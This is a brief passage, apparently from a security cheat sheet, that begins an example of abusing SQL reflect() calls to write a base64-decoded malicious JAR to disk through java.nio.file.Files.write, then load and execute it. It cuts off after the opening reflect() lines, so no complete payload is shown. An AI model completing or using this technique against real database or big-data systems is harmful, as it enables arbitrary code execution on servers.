...
Example of writing a malicious JAR to disk, loading it, and executing code:

-- Write JAR using java.nio.file.Files.write and base64 decoding
SELECT reflect(
    'java.nio.file.Files',
    'write',
    reflect(
